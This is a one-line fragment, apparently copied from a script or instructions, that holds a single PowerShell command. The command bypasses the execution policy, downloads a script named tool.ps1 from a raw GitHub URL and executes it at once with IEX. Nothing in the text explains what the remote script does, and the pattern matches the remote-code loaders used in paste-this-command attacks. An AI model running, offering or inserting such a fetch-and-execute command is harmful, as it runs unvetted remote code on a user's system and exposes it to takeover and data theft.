...
Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/tool.ps1 -UseBasicParsing)"'
